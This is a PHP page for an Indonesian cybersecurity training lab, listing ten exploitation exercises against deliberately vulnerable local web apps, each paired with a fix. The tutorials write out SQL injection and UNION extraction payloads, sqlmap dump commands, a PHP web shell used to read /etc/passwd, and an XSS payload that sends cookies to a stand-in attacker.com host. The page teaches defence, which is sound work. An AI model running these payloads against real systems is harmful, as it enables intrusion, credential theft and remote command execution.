<?php
$APPS = [
    'SIMPEG' => [
        'containers' => ['simpeg-web', 'simpeg-db', 'simpeg-phpmyadmin'],
        'url' => 'http://localhost:8080',
    ],
    'Fotorecv3' => [
        'containers' => ['fotorecv3-web', 'fotorecv3-db', 'fotorecv3-pma'],
        'url' => 'http://localhost:8082',
    ],
];
$appStatus = [];
foreach ($APPS as $key => $app) {
    $output = @shell_exec("sudo docker ps --filter name={$app['containers'][0]} --format '{{.Names}}' 2>/dev/null");
    $appStatus[$key] = !empty(trim($output ?? ''));
}

$filterApp = $_GET['app'] ?? null;
if ($filterApp && !isset($APPS[$filterApp])) $filterApp = null;

$questions = [
    [
        'no' => 1,
        'title' => 'SQL Injection — Bypass Login (SIMPEG)',
        'app' => 'SIMPEG',
        'url' => 'http://localhost:8080/login.php',
        'level' => 'Mudah',
        'goal' => 'Masuk ke dashboard tanpa mengetahui username dan password yang valid.',
        'hint' => 'Coba masukkan tanda kutip ( \' ) di field username dan lihat pesan error-nya. Query SQL tidak difilter sama sekali.',
        'steps' => [
            'Buka http://localhost:8080/login.php',
            'Masukkan payload berikut di field Username: <code>\' OR \'1\'=\'1\' -- </code>',
            'Kosongkan password (atau isi sembarang)',
            'Klik Login',
            'Jika berhasil, Anda akan masuk ke dashboard sebagai admin.',
        ],
        'explanation' => 'Query yang dieksekusi: <code>SELECT * FROM users WHERE username = \'\' OR \'1\'=\'1\' -- \' AND password = \'...\'</code><br>Komentar <code>--</code> membuat pengecekan password diabaikan, dan <code>OR 1=1</code> membuat semua baris terpilih.',
        'fix' => 'Gunakan prepared statements / parameterized queries dengan bind_param(). Jangan pernah concatenate input user langsung ke query SQL.',
    ],
    [
        'no' => 2,
        'title' => 'SQL Injection — Ekstrak Data dengan UNION (SIMPEG)',
        'app' => 'SIMPEG',
        'url' => 'http://localhost:8080/pegawai_detail.php?id=1',
        'level' => 'Sedang',
        'goal' => 'Mengekstrak data dari tabel users melalui celah SQL Injection di halaman detail pegawai.',
        'hint' => 'Parameter <code>id</code> di URL tidak divalidasi. Coba tambahkan <code>UNION SELECT</code> untuk menggabungkan data dari tabel users.',
        'steps' => [
            'Buka http://localhost:8080/pegawai_detail.php?id=1',
            'Coba ganti id dengan: <code>1 UNION SELECT 1,username,password,role,nama FROM users</code>',
            'Perhatikan data username dan password dari semua user muncul di halaman.',
            'Coba juga: <code>1 UNION SELECT 1,username,password,role,nama FROM users WHERE id=1</code>',
        ],
        'explanation' => 'Query menjadi: <code>SELECT * FROM pegawai WHERE id = 1 UNION SELECT 1,username,password,role,nama FROM users</code><br>UNION menggabungkan hasil dua query. Jumlah kolom harus sama (5 kolom).',
        'fix' => 'Cast parameter id ke integer: <code>$id = (int)$_GET[\'id\'];</code> atau gunakan prepared statements.',
    ],
    [
        'no' => 3,
        'title' => 'IDOR — Akses Data Pegawai Lain (SIMPEG)',
        'app' => 'SIMPEG',
        'url' => 'http://localhost:8080/pegawai_detail.php?id=1',
        'level' => 'Mudah',
        'goal' => 'Mengakses detail pegawai lain hanya dengan mengubah ID di URL.',
        'hint' => 'Coba ganti angka <code>id</code> di URL dengan nomor lain. Tidak ada pengecekan otorisasi.',
        'steps' => [
            'Login sebagai user biasa (user1 / user123) atau admin',
            'Di dashboard, klik Detail pada pegawai mana saja',
            'Perhatikan URL: <code>pegawai_detail.php?id=1</code>',
            'Ganti <code>id=1</code> menjadi <code>id=3</code>, <code>id=5</code>, <code>id=10</code>',
            'Semua data bisa diakses tanpa batasan.',
        ],
        'explanation' => 'Aplikasi tidak memverifikasi apakah user yang login berhak mengakses data pegawai dengan ID tertentu. Siapa pun bisa mengakses data pegawai mana saja.',
        'fix' => 'Lakukan pengecekan otorisasi sebelum menampilkan data. Gunakan UUID atau token acak sebagai pengganti ID integer yang mudah ditebak.',
    ],
    [
        'no' => 4,
        'title' => 'IDOR — Lihat Password User Lain (SIMPEG)',
        'app' => 'SIMPEG',
        'url' => 'http://localhost:8080/profile.php',
        'level' => 'Mudah',
        'goal' => 'Melihat password (plaintext) user lain, termasuk admin.',
        'hint' => 'Halaman profil menerima parameter <code>id</code> via URL. Coba akses ID user lain.',
        'steps' => [
            'Login sebagai user1 / user123',
            'Klik "Profil Saya" di navbar',
            'URL akan seperti: <code>profile.php?id=2</code> (ID user Anda)',
            'Ganti <code>id=2</code> menjadi <code>id=1</code>',
            'Lihat password admin (p@sswoRd1234) muncul di halaman!',
        ],
        'explanation' => 'Parameter <code>id</code> bisa diubah oleh user. Aplikasi tidak memeriksa apakah ID tersebut milik user yang sedang login. Password disimpan dalam bentuk plaintext tanpa hash.',
        'fix' => 'Ambil ID user dari session (<code>$_SESSION[\'user_id\']</code>), bukan dari parameter URL. Hash password dengan <code>password_hash()</code>. Jangan pernah tampilkan password di halaman.',
    ],
    [
        'no' => 5,
        'title' => 'RBAC — Privilege Escalation (SIMPEG)',
        'app' => 'SIMPEG',
        'url' => 'http://localhost:8080/users.php',
        'level' => 'Sedang',
        'goal' => 'Mengakses halaman manajemen user yang seharusnya hanya untuk admin, padahal login sebagai user biasa.',
        'hint' => 'Coba akses langsung URL halaman admin meskipun login sebagai user biasa.',
        'steps' => [
            'Login sebagai user1 / user123',
            'Perhatikan navbar hanya menampilkan menu terbatas (tidak ada Manajemen User)',
            'Akses langsung: http://localhost:8080/users.php',
            'Halaman manajemen user terbuka!',
            'Coba hapus user admin dengan mengklik "Hapus"',
            'Atau edit role user Anda sendiri menjadi admin via modal Edit.',
        ],
        'explanation' => 'Pengecekan role hanya dilakukan di tampilan navbar (frontend), bukan di logika backend. Halaman users.php tidak memvalidasi role user sebelum memproses aksi.',
        'fix' => 'Tambahkan pengecekan role di setiap halaman admin: <code>if ($_SESSION[\'role\'] !== \'admin\') { die("Akses ditolak"); }</code>. Jangan hanya sembunyikan tombol di frontend.',
    ],
    [
        'no' => 6,
        'title' => 'XSS — Reflected Cross-Site Scripting (SIMPEG)',
        'app' => 'SIMPEG',
        'url' => 'http://localhost:8080/dashboard.php?search=<script>alert(1)</script>',
        'level' => 'Mudah',
        'goal' => 'Menyisipkan script JavaScript yang dieksekusi di halaman dashboard.',
        'hint' => 'Input pada kotak pencarian langsung ditampilkan kembali (reflected) tanpa sanitasi.',
        'steps' => [
            'Login ke SIMPEG',
            'Di kotak pencarian, masukkan: <code>&lt;script&gt;alert(\'XSS Berhasil!\')&lt;/script&gt;</code>',
            'Klik Cari',
            'Muncul pop-up alert! Script berhasil dieksekusi.',
            'Coba payload untuk mencuri cookie: <code>&lt;script&gt;document.location=\'http://attacker.com/?c=\'+document.cookie&lt;/script&gt;</code>',
        ],
        'explanation' => 'Nilai <code>$search</code> dari GET parameter langsung di-output ke HTML tanpa fungsi <code>htmlspecialchars()</code>. Browser mengeksekusi tag <code>&lt;script&gt;</code> karena dianggap sebagai kode HTML.',
        'fix' => 'Gunakan <code>htmlspecialchars($search, ENT_QUOTES, \'UTF-8\')</code> untuk semua output yang mengandung data user. Terapkan Content Security Policy (CSP) header.',
    ],
    [
        'no' => 7,
        'title' => 'File Upload — Upload Web Shell (SIMPEG)',
        'app' => 'SIMPEG',
        'url' => 'http://localhost:8080/upload.php',
        'level' => 'Sulit',
        'goal' => 'Mengupload file PHP berbahaya (web shell) untuk mendapatkan akses eksekusi perintah di server.',
        'hint' => 'Halaman upload tidak memvalidasi tipe file. Upload file .php lalu akses langsung.',
        'steps' => [
            'Login ke SIMPEG (sebagai user mana pun)',
            'Buka http://localhost:8080/upload.php',
            'Buat file shell.php dengan isi: <code>&lt;?php system($_GET[\'cmd\']); ?&gt;</code>',
            'Upload file tersebut',
            'Akses: http://localhost:8080/uploads/shell.php?cmd=id',
            'Output akan menampilkan informasi user server (www-data)',
            'Coba: <code>?cmd=ls -la</code> atau <code>?cmd=cat /etc/passwd</code>',
        ],
        'explanation' => 'Tidak ada validasi ekstensi file, MIME type, atau ukuran. File .php bisa diupload dan dieksekusi langsung karena berada di dalam document root.',
        'fix' => 'Validasi ekstensi (whitelist .jpg, .png, dll), validasi MIME type dengan finfo, rename file dengan nama acak, simpan di luar document root, dan pasang .htaccess di folder uploads untuk memblokir eksekusi PHP.',
    ],
    [
        'no' => 8,
        'title' => 'SQL Injection — Ekstrak Data Foto (Fotorecv3)',
        'app' => 'Fotorecv3',
        'url' => 'http://localhost:8082/cat.php?id=1',
        'level' => 'Sedang',
        'goal' => 'Mengekstrak data dari database aplikasi fotografi melalui celah SQL Injection.',
        'hint' => 'Parameter <code>id</code> di halaman kategori langsung dimasukkan ke query SQL tanpa validasi. Coba dengan nilai negatif atau karakter khusus.',
        'steps' => [
            'Buka http://localhost:8082/',
            'Klik salah satu kategori (misal "Pemandangan Alam")',
            'Perhatikan URL: <code>cat.php?id=1</code>',
            'Coba: <code>cat.php?id=1 UNION SELECT 1,login,password,4 FROM users</code>',
            'Data username dan password (MD5 hash) akan muncul di halaman.',
            'Gunakan sqlmap untuk otomatisasi: <code>sqlmap -u "http://localhost:8082/cat.php?id=1" --batch --dump</code>',
        ],
        'explanation' => 'Query: <code>SELECT * FROM pictures where cat=1</code>. Parameter <code>$cat</code> langsung dari <code>$_GET["id"]</code> tanpa sanitasi. UNION SELECT bisa mengekstrak data dari tabel manapun.',
        'fix' => 'Cast parameter ke integer: <code>(int)$_GET["id"]</code>. Gunakan prepared statements. Jangan tampilkan error database ke user.',
    ],
    [
        'no' => 9,
        'title' => 'Authentication Bypass — Admin Panel (Fotorecv3)',
        'app' => 'Fotorecv3',
        'url' => 'http://localhost:8082/admin/login.php',
        'level' => 'Sedang',
        'goal' => 'Masuk ke panel admin tanpa mengetahui password yang benar.',
        'hint' => 'Coba SQL Injection di form login admin. Password diverifikasi menggunakan MD5.',
        'steps' => [
            'Buka http://localhost:8082/admin/login.php',
            'Di field Username, masukkan: <code>admin\' -- </code>',
            'Isi Password sembarang (misal: 123)',
            'Klik Login',
            'Anda masuk ke panel admin!',
            'Penjelasan: Query menjadi <code>SELECT * FROM users where login="admin\' -- " and password=md5("123")</code> — komentar <code>--</code> menghilangkan pengecekan password.',
            'Coba juga dengan sqlmap: <code>sqlmap -u "http://localhost:8082/admin/index.php" --data="user=admin&password=admin" --batch --dump</code>',
        ],
        'explanation' => 'Fungsi login menggunakan <code>$mysqli->real_escape_string()</code> pada parameter, namun password diverifikasi dengan <code>$user === $row[\'login\']</code>. Jika login berhasil karena SQLi, nilai session <code>$_SESSION["admin"]</code> tetap di-set.',
        'fix' => 'Gunakan prepared statements untuk query login. Jangan gunakan komentar SQL untuk bypass. Hash password dengan algoritma yang aman (bcrypt/argon2).',
    ],
    [
        'no' => 10,
        'title' => 'File Upload — Bypass Filter Ekstensi (Fotorecv3)',
        'app' => 'Fotorecv3',
        'url' => 'http://localhost:8082/admin/new.php',
        'level' => 'Sulit',
        'goal' => 'Mengupload file PHP ke server meskipun ada filter yang melarang ekstensi .php.',
        'hint' => 'Fungsi upload memblokir file .php, tetapi regex validasi filename punya celah. Coba ekstensi lain yang tetap dieksekusi sebagai PHP.',
        'steps' => [
            'Login ke admin fotorecv3: admin / p@sswoRd1234',
            'Buka http://localhost:8082/admin/new.php',
            'Perhatikan aturan: filename harus 3-12 huruf + titik + 2-4 huruf, dan tidak boleh .php',
            'Buat file dengan ekstensi <code>.phtml</code> atau <code>.php5</code> atau <code>.pht</code>',
            'Upload file dengan nama: <code>shell.phtml</code> berisi: <code>&lt;?php system($_GET[\'cmd\']); ?&gt;</code>',
            'Akses: http://localhost:8082/admin/uploads/shell.phtml?cmd=id',
            'Atau eksploitasi bug regex: titik <code>.</code> di regex <code>/\w{3,12}\.\w{2,4}$/</code> sudah di-escape dengan benar, tapi coba bypass dengan double extension atau karakter khusus.',
        ],
        'explanation' => 'Filter hanya memblokir ekstensi <code>.php</code> secara eksplisit. Ekstensi lain seperti <code>.phtml</code>, <code>.php5</code>, <code>.pht</code> tetap dieksekusi sebagai PHP oleh server Apache jika terdaftar di konfigurasi.',
        'fix' => 'Gunakan whitelist ekstensi yang ketat: hanya izinkan <code>.jpg, .jpeg, .png, .gif</code>. Generate ulang nama file dengan <code>uniqid()</code>. Simpan file di luar document root. Konfigurasi Apache untuk hanya mengeksekusi ekstensi tertentu.',
    ],
];
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab Keamanan Siber<?= $filterApp ? " - $filterApp" : '' ?> - Soal Praktik</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: #0f0f1a;
            color: #e0e0e0;
            min-height: 100vh;
        }
        .container { max-width: 960px; margin: 0 auto; padding: 30px 20px; }
        h1 {
            text-align: center;
            font-weight: 300;
            font-size: 2em;
            margin-bottom: 8px;
            color: #fff;
        }
        .subtitle {
            text-align: center;
            color: #888;
            margin-bottom: 30px;
            font-size: 0.95em;
        }
        .nav-links {
            text-align: center;
            margin-bottom: 30px;
        }
        .nav-links a {
            color: #e94560;
            text-decoration: none;
            margin: 0 10px;
            padding: 6px 16px;
            border: 1px solid #e94560;
            border-radius: 6px;
            font-size: 0.9em;
            transition: all 0.2s;
        }
        .nav-links a.active {
            background: #e94560;
            color: #fff;
            cursor: default;
        }
        .nav-links a:hover {
            background: #e94560;
            color: #fff;
        }
        .soal {
            background: #1a1a2e;
            border-radius: 12px;
            padding: 24px;
            margin-bottom: 20px;
            border: 1px solid #2a2a4a;
            transition: border-color 0.2s;
        }
        .soal:hover { border-color: #e94560; }
        .soal-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 12px;
            flex-wrap: wrap;
        }
        .soal-no {
            background: #e94560;
            color: #fff;
            width: 36px;
            height: 36px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 0.9em;
            flex-shrink: 0;
        }
        .soal-title {
            font-size: 1.15em;
            font-weight: 500;
            color: #fff;
            flex: 1;
        }
        .badge {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 20px;
            font-size: 0.75em;
            font-weight: 600;
        }
        .badge-simpeg { background: rgba(233, 69, 96, 0.2); color: #e94560; }
        .badge-foto  { background: rgba(76, 175, 80, 0.15); color: #81c784; }
        .badge-easy  { background: rgba(76, 175, 80, 0.15); color: #81c784; }
        .badge-medium { background: rgba(255, 193, 7, 0.15); color: #ffd54f; }
        .badge-hard  { background: rgba(244, 67, 54, 0.15); color: #ef9a9a; }
        .soal-goal {
            background: rgba(21, 101, 192, 0.1);
            border-left: 3px solid #1976d2;
            padding: 10px 14px;
            margin-bottom: 12px;
            border-radius: 4px;
            font-size: 0.9em;
            color: #bbb;
        }
        .soal-goal strong { color: #64b5f6; }
        .status-summary {
            display: flex; gap: 16px; justify-content: center; flex-wrap: wrap;
            margin-bottom: 20px;
        }
        .status-item {
            display: flex; align-items: center; gap: 8px;
            padding: 8px 16px; border-radius: 8px;
            font-size: 0.85em;
        }
        .status-item.on { background: rgba(76, 175, 80, 0.1); color: #81c784; }
        .status-item.off { background: rgba(244, 67, 54, 0.08); color: #e57373; }
        .stat-dot {
            width: 8px; height: 8px; border-radius: 50%; display: inline-block;
        }
        .stat-dot.green { background: #4caf50; }
        .stat-dot.red { background: #f44336; }
        .stat-toggle {
            color: #888 !important; font-size: 0.85em; border: none !important;
            padding: 2px 8px !important; margin: 0 !important;
        }
        .stat-toggle:hover { color: #e94560 !important; }
        .soal-locked { border-color: #2a2a2a !important; opacity: 0.7; }
        .soal-locked:hover { border-color: #2a2a2a !important; transform: none !important; }
        .soal-locked-msg {
            padding: 16px 20px; color: #777; font-size: 0.9em;
            display: flex; align-items: center; gap: 10px;
        }
        .lock-icon { font-size: 1.3em; }
        .togglers {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
            margin-bottom: 4px;
        }
        .togglers button {
            background: #0f3460;
            color: #a8a8b3;
            border: 1px solid #2a2a4a;
            padding: 6px 14px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85em;
            transition: all 0.2s;
        }
        .togglers button:hover {
            background: #1a1a2e;
            color: #fff;
            border-color: #e94560;
        }
        .togglers button.active {
            background: #e94560;
            color: #fff;
            border-color: #e94560;
        }
        .soal-content {
            display: none;
            margin-top: 12px;
            padding: 16px;
            background: #14142a;
            border-radius: 8px;
            border: 1px solid #2a2a4a;
        }
        .soal-content.show { display: block; }
        .soal-content h4 {
            color: #e94560;
            font-weight: 500;
            font-size: 0.95em;
            margin-bottom: 8px;
        }
        .soal-content ol {
            padding-left: 20px;
            line-height: 1.8;
            font-size: 0.9em;
        }
        .soal-content li { margin-bottom: 4px; }
        .soal-content code {
            background: #0f3460;
            padding: 1px 6px;
            border-radius: 3px;
            font-size: 0.9em;
            color: #ffd54f;
        }
        .soal-content a {
            color: #64b5f6;
            text-decoration: none;
        }
        .soal-content a:hover { text-decoration: underline; }
        .footer {
            text-align: center;
            margin-top: 40px;
            color: #555;
            font-size: 0.8em;
        }
    </style>
</head>
<body>
<div class="container">
    <h1>Lab Keamanan Siber</h1>
    <p class="subtitle">10 Soal Praktik Pengujian Celah Keamanan Web
        <?php if ($filterApp): ?>
        — Filter: <strong><?= $filterApp ?></strong>
        <a href="lab.php" style="color:#888;font-size:0.8em;">[tampilkan semua]</a>
        <?php endif; ?>
    </p>

    <div class="status-summary">
        <?php foreach ($APPS as $key => $app): $on = $appStatus[$key]; ?>
        <span class="status-item <?= $on ? 'on' : 'off' ?>">
            <span class="stat-dot <?= $on ? 'green' : 'red' ?>"></span>
            <?= $key ?>: <?= $on ? 'Sedang Berjalan' : 'Berhenti' ?>
            <a href="/" class="stat-toggle"><?= $on ? 'Stop' : 'Start' ?></a>
        </span>
        <?php endforeach; ?>
    </div>

    <div class="nav-links">
        <a href="/">Launcher</a>
        <a href="lab.php">Semua</a>
        <a href="lab.php?app=SIMPEG" class="<?= $filterApp === 'SIMPEG' ? 'active' : '' ?>">SIMPEG</a>
        <a href="lab.php?app=Fotorecv3" class="<?= $filterApp === 'Fotorecv3' ? 'active' : '' ?>">Fotorecv3</a>
    </div>

    <?php foreach ($questions as $q):
        if ($filterApp && $q['app'] !== $filterApp) continue;
        $appRunning = $appStatus[$q['app']] ?? false;
    ?>
    <?php if ($appRunning): ?>
    <div class="soal" id="soal-<?= $q['no'] ?>">
        <div class="soal-header">
            <span class="soal-no"><?= $q['no'] ?></span>
            <span class="soal-title"><?= $q['title'] ?></span>
            <span class="badge <?= $q['app'] === 'SIMPEG' ? 'badge-simpeg' : 'badge-foto' ?>"><?= $q['app'] ?></span>
            <span class="badge <?= str_replace(['Mudah', 'Sedang', 'Sulit'], ['badge-easy', 'badge-medium', 'badge-hard'], $q['level']) ?>"><?= $q['level'] ?></span>
        </div>

        <div class="soal-goal">
            <strong>Tujuan:</strong> <?= $q['goal'] ?>
        </div>

        <div class="togglers">
            <button onclick="toggle('hint-<?= $q['no'] ?>', this)" class="active">Hint</button>
            <button onclick="toggle('steps-<?= $q['no'] ?>', this)">Tutorial</button>
            <button onclick="toggle('explain-<?= $q['no'] ?>', this)">Penjelasan</button>
            <button onclick="toggle('fix-<?= $q['no'] ?>', this)">Cara Memperbaiki</button>
        </div>

        <div id="hint-<?= $q['no'] ?>" class="soal-content show">
            <h4>Hint</h4>
            <p style="font-size:0.9em; color:#ffd54f; font-style:italic;"><?= $q['hint'] ?></p>
            <p style="margin-top:8px; font-size:0.85em; color:#666;">URL: <a href="<?= $q['url'] ?>" target="_blank"><?= htmlspecialchars($q['url']) ?></a></p>
        </div>

        <div id="steps-<?= $q['no'] ?>" class="soal-content">
            <h4>Tutorial Langkah demi Langkah</h4>
            <ol>
                <?php foreach ($q['steps'] as $s): ?>
                <li><?= $s ?></li>
                <?php endforeach; ?>
            </ol>
        </div>

        <div id="explain-<?= $q['no'] ?>" class="soal-content">
            <h4>Penjelasan Teknis</h4>
            <p style="font-size:0.9em; line-height:1.7;"><?= $q['explanation'] ?></p>
        </div>

        <div id="fix-<?= $q['no'] ?>" class="soal-content">
            <h4>Cara Memperbaiki</h4>
            <p style="font-size:0.9em; line-height:1.7;"><?= $q['fix'] ?></p>
        </div>
    </div>
    <?php else: ?>
    <div class="soal soal-locked" id="soal-<?= $q['no'] ?>">
        <div class="soal-header">
            <span class="soal-no"><?= $q['no'] ?></span>
            <span class="soal-title" style="color:#555;"><?= $q['title'] ?></span>
            <span class="badge <?= $q['app'] === 'SIMPEG' ? 'badge-simpeg' : 'badge-foto' ?>"><?= $q['app'] ?></span>
            <span class="badge <?= str_replace(['Mudah', 'Sedang', 'Sulit'], ['badge-easy', 'badge-medium', 'badge-hard'], $q['level']) ?>"><?= $q['level'] ?></span>
        </div>
        <div class="soal-locked-msg">
            <span class="lock-icon">&#128274;</span>
            Aplikasi <strong><?= $q['app'] ?></strong> belum berjalan.
            <a href="/" style="color:#e94560;">Start aplikasi</a> terlebih dahulu melalui launcher untuk mengakses soal ini.
        </div>
    </div>
    <?php endif; ?>
    <?php endforeach; ?>

    <div class="footer">
        Lab Keamanan Siber &mdash; Soal Praktik<?= $filterApp ? " ($filterApp)" : '' ?> &mdash; <?= date('Y') ?>
    </div>
</div>

<script>
function toggle(id, btn) {
    const el = document.getElementById(id);
    const parent = el.parentElement;
    const buttons = parent.querySelectorAll('.togglers button');
    buttons.forEach(b => b.classList.remove('active'));
    parent.querySelectorAll('.soal-content').forEach(c => c.classList.remove('show'));
    el.classList.add('show');
    btn.classList.add('active');
}
</script>
</body>
</html>
